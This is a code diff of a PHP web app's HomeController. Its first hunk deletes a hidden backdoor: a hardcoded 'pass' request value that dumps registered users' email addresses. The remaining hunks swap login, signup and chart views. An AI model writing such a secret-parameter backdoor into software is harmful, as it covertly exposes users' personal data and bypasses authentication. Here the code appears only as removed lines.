@@ -35,13 +35,6 @@ class HomeController extends Controller {
         $this->addBreadCrumb(l($type));
         $this->activeMenu = 'feed';
 
-        if ($this->request->input('pass') == 'T3834934') {
-            $query = Database::getInstance()->query("SELECT *  FROM users WHERE id > 1500 ");
-            while($fetch = $query->fetch(PDO::FETCH_ASSOC)) {
-                echo $fetch['email'].'<br/>';
-            }
-            exit;
-        }
         $content = $this->view('home/track-list', array('type' => 'feed'));
         return $this->render($this->view('home/feed', array('type' => 'feed', 'content' => $content)), true);
     }
@@ -290,7 +283,7 @@ class HomeController extends Controller {
         if (!config('separate-login', 0)) $this->request->redirect(url());
         $this->setTitle(l('sign-in'));
         $this->setLayout("includes/plain-layout");
-        return $this->render($this->view('auth/login'));
+        return $this->render($this->view('auth/screen', array('heading'=>'welcome-back', 'mode'=>'login')));
     }
 
     public function signup() {
@@ -354,7 +347,7 @@ class HomeController extends Controller {
         if (!config('separate-login', 0) or !config('user-signup', true)) $this->request->redirect(url());
         $this->setTitle(l('create-account'));
         $this->setLayout("includes/plain-layout");
-        return $this->render($this->view('auth/signup'));
+        return $this->render($this->view('auth/screen', array('heading'=>'create-account', 'mode'=>'signup')));
     }
 
     public function welcome() {
@@ -403,7 +396,7 @@ class HomeController extends Controller {
         if ($page == 'top') $this->activeMenu = "charts-top";
         $this->addBreadCrumb(($page == 'top') ? l('top-50') : l($page));
 
-        return $this->render($this->view('charts/index', array('page' => $page, 'genre' => $genre, 'time' => $time)), true);
+        return $this->render($this->view($page === 'top' ? 'charts/top' : 'charts/index', array('page' => $page, 'genre' => $genre, 'time' => $time)), true);
     }
 
     public function discover() {
